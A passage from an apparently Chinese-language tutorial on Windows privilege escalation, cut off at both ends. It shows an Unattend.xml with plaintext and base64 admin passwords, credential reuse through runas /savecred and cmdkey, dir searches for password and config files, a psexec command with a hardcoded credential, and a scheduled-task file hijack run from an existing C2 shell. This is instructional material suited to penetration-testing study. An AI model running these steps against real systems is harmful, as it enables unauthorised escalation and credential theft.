class="language-xml">NT\CurrentVersion\Winlogon&quot; /v DisableCAD /t REG_DWORD /d 1 /f<span class="hljs-tag">&lt;/<span class="hljs-name">Path</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">RunSynchronousCommand</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-comment">&lt;!-- 修改远程桌面端口并使防火墙允许通过 --&gt;</span></span><br><span class="language-xml"><span class="hljs-comment">&lt;!--</span></span><br><span class="hljs-comment"><span class="language-xml">&lt;RunSynchronousCommand wcm:action=&quot;add&quot;&gt;</span></span><br><span class="hljs-comment"><span class="language-xml">&lt;Description&gt;RDP&lt;/Description&gt;</span></span><br><span class="hljs-comment"><span class="language-xml">&lt;Order&gt;3&lt;/Order&gt;</span></span><br><span class="hljs-comment"><span class="language-xml">&lt;Path&gt;cmd /c reg add</span></span><br><span class="hljs-comment"><span class="language-xml">&quot;HKLM\SYSTEM\ControlSet001\Control\Terminal Server\Wds\rdpwd\Tds\tcp&quot; /v</span></span><br><span class="hljs-comment"><span class="language-xml">PortNumber /t REG_DWORD /d 13389 /f&lt;/Path&gt;</span></span><br><span class="hljs-comment"><span class="language-xml">&lt;/RunSynchronousCommand&gt;</span></span><br><span class="hljs-comment"><span class="language-xml">&lt;RunSynchronousCommand wcm:action=&quot;add&quot;&gt;</span></span><br><span class="hljs-comment"><span class="language-xml">&lt;Description&gt;RDP&lt;/Description&gt;</span></span><br><span class="hljs-comment"><span class="language-xml">&lt;Order&gt;4&lt;/Order&gt;</span></span><br><span class="hljs-comment"><span class="language-xml">&lt;Path&gt;cmd /c reg add</span></span><br><span class="hljs-comment"><span class="language-xml">&quot;HKLM\SYSTEM\ControlSet001\Control\Terminal Server\WinStations\RDP-Tcp&quot; /v</span></span><br><span class="hljs-comment"><span class="language-xml">PortNumber /t REG_DWORD /d 13389 /f&lt;/Path&gt;</span></span><br><span class="hljs-comment"><span class="language-xml">&lt;/RunSynchronousCommand&gt;</span></span><br><span class="hljs-comment"><span class="language-xml">&lt;RunSynchronousCommand wcm:action=&quot;add&quot;&gt;</span></span><br><span class="hljs-comment"><span class="language-xml">&lt;Description&gt;RDP&lt;/Description&gt;</span></span><br><span class="hljs-comment"><span class="language-xml">&lt;Order&gt;5&lt;/Order&gt;</span></span><br><span class="hljs-comment"><span class="language-xml">&lt;Path&gt;cmd /c reg add</span></span><br><span class="hljs-comment"><span class="language-xml">&quot;HKLM\SYSTEM\ControlSet001\Services\SharedAccess\Parameters\FirewallPolicy\Firew</span></span><br><span class="hljs-comment"><span class="language-xml">allRules&quot; /v &quot;</span></span><span class="hljs-template-variable">&#123;33893389-3389-3389-3389-338933893389&#125;</span><span class="language-xml"><span class="hljs-comment">&quot; /t REG_SZ /d</span></span><br><span class="hljs-comment"><span class="language-xml">&quot;v2.29|Action=Allow|Active=TRUE|Dir=In|Protocol=6|LPort=13389|Name=13389|&quot;</span></span><br><span class="hljs-comment"><span class="language-xml">/f&lt;/Path&gt;</span></span><br><span class="hljs-comment"><span class="language-xml">&lt;/RunSynchronousCommand&gt;</span></span><br><span class="hljs-comment"><span class="language-xml">--&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">RunSynchronous</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">component</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-comment">&lt;!-- 禁用系统还原 --&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">component</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;Microsoft-Windows-SystemRestore-Main&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml"><span class="hljs-attr">processorArchitecture</span>=<span class="hljs-string">&quot;amd64&quot;</span> <span class="hljs-attr">publicKeyToken</span>=<span class="hljs-string">&quot;31bf3856ad364e35&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml"><span class="hljs-attr">language</span>=<span class="hljs-string">&quot;neutral&quot;</span> <span class="hljs-attr">versionScope</span>=<span class="hljs-string">&quot;nonSxS&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml"><span class="hljs-attr">xmlns:wcm</span>=<span class="hljs-string">&quot;http://schemas.microsoft.com/WMIConfig/2002/State&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml"><span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">DisableSR</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">DisableSR</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">component</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-comment">&lt;!-- 启用远程桌面 --&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">component</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;Microsoft-Windows-TerminalServices-LocalSessionManager&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml"><span class="hljs-attr">processorArchitecture</span>=<span class="hljs-string">&quot;amd64&quot;</span> <span class="hljs-attr">publicKeyToken</span>=<span class="hljs-string">&quot;31bf3856ad364e35&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml"><span class="hljs-attr">language</span>=<span class="hljs-string">&quot;neutral&quot;</span> <span class="hljs-attr">versionScope</span>=<span class="hljs-string">&quot;nonSxS&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml"><span class="hljs-attr">xmlns:wcm</span>=<span class="hljs-string">&quot;http://schemas.microsoft.com/WMIConfig/2002/State&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml"><span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">fDenyTSConnections</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-name">fDenyTSConnections</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">component</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-comment">&lt;!-- 启用默认远程桌面防火墙规则 --&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">component</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;Networking-MPSSVC-Svc&quot;</span> <span class="hljs-attr">processorArchitecture</span>=<span class="hljs-string">&quot;amd64&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml"><span class="hljs-attr">publicKeyToken</span>=<span class="hljs-string">&quot;31bf3856ad364e35&quot;</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&quot;neutral&quot;</span> <span class="hljs-attr">versionScope</span>=<span class="hljs-string">&quot;nonSxS&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml"><span class="hljs-attr">xmlns:wcm</span>=<span class="hljs-string">&quot;http://schemas.microsoft.com/WMIConfig/2002/State&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml"><span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">FirewallGroups</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">FirewallGroup</span> <span class="hljs-attr">wcm:action</span>=<span class="hljs-string">&quot;add&quot;</span> <span class="hljs-attr">wcm:keyValue</span>=<span class="hljs-string">&quot;RemoteDesktop&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Active</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">Active</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Profile</span>&gt;</span>all<span class="hljs-tag">&lt;/<span class="hljs-name">Profile</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Group</span>&gt;</span>@FirewallAPI.dll,-28752<span class="hljs-tag">&lt;/<span class="hljs-name">Group</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">FirewallGroup</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">FirewallGroups</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">component</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-comment">&lt;!-- 禁用 IE 增强模式 --&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">component</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;Microsoft-Windows-IE-ESC&quot;</span> <span class="hljs-attr">processorArchitecture</span>=<span class="hljs-string">&quot;amd64&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml"><span class="hljs-attr">publicKeyToken</span>=<span class="hljs-string">&quot;31bf3856ad364e35&quot;</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&quot;neutral&quot;</span> <span class="hljs-attr">versionScope</span>=<span class="hljs-string">&quot;nonSxS&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml"><span class="hljs-attr">xmlns:wcm</span>=<span class="hljs-string">&quot;http://schemas.microsoft.com/WMIConfig/2002/State&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml"><span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">IEHardenAdmin</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-name">IEHardenAdmin</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">IEHardenUser</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-name">IEHardenUser</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">component</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">component</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;Microsoft-Windows-International-Core&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml"><span class="hljs-attr">processorArchitecture</span>=<span class="hljs-string">&quot;amd64&quot;</span> <span class="hljs-attr">publicKeyToken</span>=<span class="hljs-string">&quot;31bf3856ad364e35&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml"><span class="hljs-attr">language</span>=<span class="hljs-string">&quot;neutral&quot;</span> <span class="hljs-attr">versionScope</span>=<span class="hljs-string">&quot;nonSxS&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml"><span class="hljs-attr">xmlns:wcm</span>=<span class="hljs-string">&quot;http://schemas.microsoft.com/WMIConfig/2002/State&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml"><span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">InputLocale</span>&gt;</span>0804:</span><span class="hljs-template-variable">&#123;81D4E9C9-1D3B-41BC-9E6C-4B40BF79E35E&#125;</span><span class="hljs-template-variable">&#123;FA550B04-</span><br><span class="hljs-template-variable">5AD7-411f-A5AC-CA038EC515D7&#125;</span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">InputLocale</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">SystemLocale</span>&gt;</span>zh-CN<span class="hljs-tag">&lt;/<span class="hljs-name">SystemLocale</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">UILanguage</span>&gt;</span>zh-CN<span class="hljs-tag">&lt;/<span class="hljs-name">UILanguage</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">UILanguageFallback</span>&gt;</span>zh-CN<span class="hljs-tag">&lt;/<span class="hljs-name">UILanguageFallback</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">UserLocale</span>&gt;</span>zh-CN<span class="hljs-tag">&lt;/<span class="hljs-name">UserLocale</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">component</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">component</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;Microsoft-Windows-Security-SPP-UX&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml"><span class="hljs-attr">processorArchitecture</span>=<span class="hljs-string">&quot;amd64&quot;</span> <span class="hljs-attr">publicKeyToken</span>=<span class="hljs-string">&quot;31bf3856ad364e35&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml"><span class="hljs-attr">language</span>=<span class="hljs-string">&quot;neutral&quot;</span> <span class="hljs-attr">versionScope</span>=<span class="hljs-string">&quot;nonSxS&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml"><span class="hljs-attr">xmlns:wcm</span>=<span class="hljs-string">&quot;http://schemas.microsoft.com/WMIConfig/2002/State&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml"><span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">SkipAutoActivation</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">SkipAutoActivation</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">component</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">component</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;Microsoft-Windows-SQMApi&quot;</span> <span class="hljs-attr">processorArchitecture</span>=<span class="hljs-string">&quot;amd64&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml"><span class="hljs-attr">publicKeyToken</span>=<span class="hljs-string">&quot;31bf3856ad364e35&quot;</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&quot;neutral&quot;</span> <span class="hljs-attr">versionScope</span>=<span class="hljs-string">&quot;nonSxS&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml"><span class="hljs-attr">xmlns:wcm</span>=<span class="hljs-string">&quot;http://schemas.microsoft.com/WMIConfig/2002/State&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml"><span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">CEIPEnabled</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">CEIPEnabled</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">component</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">component</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;Microsoft-Windows-Shell-Setup&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml"><span class="hljs-attr">processorArchitecture</span>=<span class="hljs-string">&quot;amd64&quot;</span> <span class="hljs-attr">publicKeyToken</span>=<span class="hljs-string">&quot;31bf3856ad364e35&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml"><span class="hljs-attr">language</span>=<span class="hljs-string">&quot;neutral&quot;</span> <span class="hljs-attr">versionScope</span>=<span class="hljs-string">&quot;nonSxS&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml"><span class="hljs-attr">xmlns:wcm</span>=<span class="hljs-string">&quot;http://schemas.microsoft.com/WMIConfig/2002/State&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml"><span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ComputerName</span>&gt;</span>*<span class="hljs-tag">&lt;/<span class="hljs-name">ComputerName</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ProductKey</span>&gt;</span>WMDGN-G9PQG-XVVXX-R3X43-63DFG<span class="hljs-tag">&lt;/<span class="hljs-name">ProductKey</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">component</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">settings</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">settings</span> <span class="hljs-attr">pass</span>=<span class="hljs-string">&quot;oobeSystem&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">component</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;Microsoft-Windows-Shell-Setup&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml"><span class="hljs-attr">processorArchitecture</span>=<span class="hljs-string">&quot;amd64&quot;</span> <span class="hljs-attr">publicKeyToken</span>=<span class="hljs-string">&quot;31bf3856ad364e35&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml"><span class="hljs-attr">language</span>=<span class="hljs-string">&quot;neutral&quot;</span> <span class="hljs-attr">versionScope</span>=<span class="hljs-string">&quot;nonSxS&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml"><span class="hljs-attr">xmlns:wcm</span>=<span class="hljs-string">&quot;http://schemas.microsoft.com/WMIConfig/2002/State&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml"><span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-comment">&lt;!-- 自动登录 --&gt;</span></span><br><span class="language-xml"><span class="hljs-comment">&lt;!--</span></span><br><span class="hljs-comment"><span class="language-xml">&lt;AutoLogon&gt;</span></span><br><span class="hljs-comment"><span class="language-xml">&lt;Password&gt;</span></span><br><span class="hljs-comment"><span class="language-xml">&lt;Value&gt;QWRtaW5AMTIz&lt;/Value&gt;</span></span><br><span class="hljs-comment"><span class="language-xml">&lt;PlainText&gt;true&lt;/PlainText&gt;</span></span><br><span class="hljs-comment"><span class="language-xml">&lt;/Password&gt;</span></span><br><span class="hljs-comment"><span class="language-xml">&lt;Enabled&gt;true&lt;/Enabled&gt;</span></span><br><span class="hljs-comment"><span class="language-xml">&lt;LogonCount&gt;1&lt;/LogonCount&gt;</span></span><br><span class="hljs-comment"><span class="language-xml">&lt;Username&gt;Administrator&lt;/Username&gt;</span></span><br><span class="hljs-comment"><span class="language-xml">&lt;/AutoLogon&gt;</span></span><br><span class="hljs-comment"><span class="language-xml">--&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">OOBE</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">HideEULAPage</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">HideEULAPage</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">HideLocalAccountScreen</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">HideLocalAccountScreen</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">HideOEMRegistrationScreen</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">HideOEMRegistrationScreen</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">HideOnlineAccountScreens</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">HideOnlineAccountScreens</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">HideWirelessSetupInOOBE</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">HideWirelessSetupInOOBE</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">NetworkLocation</span>&gt;</span>Other<span class="hljs-tag">&lt;/<span class="hljs-name">NetworkLocation</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ProtectYourPC</span>&gt;</span>3<span class="hljs-tag">&lt;/<span class="hljs-name">ProtectYourPC</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">SkipMachineOOBE</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">SkipMachineOOBE</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">SkipUserOOBE</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">SkipUserOOBE</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">OOBE</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">RegisteredOrganization</span>&gt;</span>Organization<span class="hljs-tag">&lt;/<span class="hljs-name">RegisteredOrganization</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">RegisteredOwner</span>&gt;</span>Owner<span class="hljs-tag">&lt;/<span class="hljs-name">RegisteredOwner</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">DisableAutoDaylightTimeSet</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-name">DisableAutoDaylightTimeSet</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">TimeZone</span>&gt;</span>China Standard Time<span class="hljs-tag">&lt;/<span class="hljs-name">TimeZone</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">UserAccounts</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">AdministratorPassword</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Value</span>&gt;</span>password<span class="hljs-tag">&lt;/<span class="hljs-name">Value</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">PlainText</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">PlainText</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">AdministratorPassword</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">UserAccounts</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">component</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">settings</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">unattend</span>&gt;</span></span><br></code></pre></td></tr></table></figure><h4 id="本地凭证泄露"><a href="#本地凭证泄露" class="headerlink" title="本地凭证泄露"></a>本地凭证泄露</h4><p>Windows 具有runas 命令，允许用户使用其他用户的权限运行命令，如果在本地中发现了凭证，就可以利用他提权,第一次输入的时候，提示要输入密码</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">runas <span class="hljs-regexp">/savecred /u</span>ser:administrator cmd<br></code></pre></td></tr></table></figure><p><img src="/img/image-20240109101803601.png" alt="image-20240109101803601"></p><p>如果管理员输入过密码之后，凭证就保留在系统中输入 cmdkey &#x2F;list 查看</p><p><img src="/img/image-20240109103507673.png" alt="image-20240109103507673"> </p><p>接着我们就可以使用命令提权，下次运行此命令就不需要密码</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">runas <span class="hljs-regexp">/savecred /u</span>ser:administrator cmd<br></code></pre></td></tr></table></figure><h4 id="其他的文件泄露"><a href="#其他的文件泄露" class="headerlink" title="其他的文件泄露"></a>其他的文件泄露</h4><p>可能在有的电脑上会发现以下xls或者world或者浏览器的账号密码泄露，我们只要拿到了他的明文的账 号密码或者hash就可以提权</p><h3 id="提权复现"><a href="#提权复现" class="headerlink" title="提权复现"></a>提权复现</h3><p>先有一个CS或者MSF的SHELL</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">runas <span class="hljs-regexp">/savecred /u</span>ser:administrator cmd<br></code></pre></td></tr></table></figure><p>收集电脑上的信息和相关配置文件</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">cmdkey <span class="hljs-string">/list</span><br>dir <span class="hljs-string">/a</span> <span class="hljs-string">/s</span> <span class="hljs-string">/b</span> C:\Unattend.xml<br>dir <span class="hljs-string">/a</span> <span class="hljs-string">/s</span> <span class="hljs-string">/b</span> d:\<span class="hljs-string">&quot;*.txt&quot;</span><br>dir <span class="hljs-string">/a</span> <span class="hljs-string">/s</span> <span class="hljs-string">/b</span> d:\<span class="hljs-string">&quot;*.xml&quot;</span><br>dir <span class="hljs-string">/a</span> <span class="hljs-string">/s</span> <span class="hljs-string">/b</span> d:\<span class="hljs-string">&quot;*.mdb&quot;</span><br>dir <span class="hljs-string">/a</span> <span class="hljs-string">/s</span> <span class="hljs-string">/b</span> d:\<span class="hljs-string">&quot;*.sql&quot;</span><br>dir <span class="hljs-string">/a</span> <span class="hljs-string">/s</span> <span class="hljs-string">/b</span> d:\<span class="hljs-string">&quot;*.mdf&quot;</span><br>dir <span class="hljs-string">/a</span> <span class="hljs-string">/s</span> <span class="hljs-string">/b</span> d:\<span class="hljs-string">&quot;*.eml&quot;</span><br>dir <span class="hljs-string">/a</span> <span class="hljs-string">/s</span> <span class="hljs-string">/b</span> d:\<span class="hljs-string">&quot;*.pst&quot;</span><br>dir <span class="hljs-string">/a</span> <span class="hljs-string">/s</span> <span class="hljs-string">/b</span> d:\<span class="hljs-string">&quot;*conf*&quot;</span><br>dir <span class="hljs-string">/a</span> <span class="hljs-string">/s</span> <span class="hljs-string">/b</span> d:\<span class="hljs-string">&quot;*bak*&quot;</span><br>dir <span class="hljs-string">/a</span> <span class="hljs-string">/s</span> <span class="hljs-string">/b</span> d:\<span class="hljs-string">&quot;*pwd*&quot;</span><br>dir <span class="hljs-string">/a</span> <span class="hljs-string">/s</span> <span class="hljs-string">/b</span> d:\<span class="hljs-string">&quot;*pass*&quot;</span><br>dir <span class="hljs-string">/a</span> <span class="hljs-string">/s</span> <span class="hljs-string">/b</span> d:\<span class="hljs-string">&quot;*login*&quot;</span><br>dir <span class="hljs-string">/a</span> <span class="hljs-string">/s</span> <span class="hljs-string">/b</span> d:\<span class="hljs-string">&quot;*user*&quot;</span><br></code></pre></td></tr></table></figure><p>发现存在凭证和Unattend.xml文件</p><p><img src="/img/image-20240109103812480.png" alt="image-20240109103812480"> </p><p>利用账号和密码或者凭证提权 </p><p>利用账号密码</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">psexec.exe administrator:Admin<span class="hljs-title">@123</span><span class="hljs-title">@192</span>.<span class="hljs-number">168.41</span>.<span class="hljs-number">195</span> <span class="hljs-string">&quot;C:\Users\apache\Desktop<span class="hljs-char escape_">\12</span>3.exe&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20240109104010032.png" alt="image-20240109104010032"></p><p>利用凭证</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">runas <span class="hljs-regexp">/savecred /u</span>ser:administrator <span class="hljs-number">123</span>.exe<br></code></pre></td></tr></table></figure><h2 id="7-计划任务提权"><a href="#7-计划任务提权" class="headerlink" title="7.计划任务提权"></a>7.计划任务提权</h2><h3 id="提权原理-5"><a href="#提权原理-5" class="headerlink" title="提权原理"></a>提权原理</h3><p>计划任务提权的原理非常的简单，就是在设置计划任务的时候配置不当，导致我们<strong>可以更改计划任务执行的文件</strong>，我们可以进行劫持然后替换成自己的恶意文件达到提权的目的</p><p><img src="/img/image-20240109104853194.png" alt="image-20240109104853194"></p><h3 id="提权环境-2"><a href="#提权环境-2" class="headerlink" title="提权环境"></a>提权环境</h3><p>配置一个计划任务，是一个bat或者exe都行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">schtasks /create /s IP地址 /tn 计划任务名 /sc onstart /tr c:\文件 /ru system /f<br></code></pre></td></tr></table></figure><img src="/img/image-20240109105112295.png" alt="image-20240109105112295" style="zoom:80%;" /> <p><img src="/img/image-20240109105223649.png" alt="image-20240109105223649"> </p><p><img src="/img/image-20240109105458140.png" alt="image-20240109105458140"></p><p>配置计划任务下的文件可以被更改</p><p><img src="/img/image-20240109110012970.png" alt="image-20240109110012970"> </p><h3 id="提权实验-3"><a href="#提权实验-3" class="headerlink" title="提权实验"></a>提权实验</h3><p>1.拥有一个MSF或者CS的shell</p><p>2.使用命令查询计划任务的运行情况（一半权限低的用户查询不了）,如果提示无法加载资源就要更改编码 chcp 437</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span 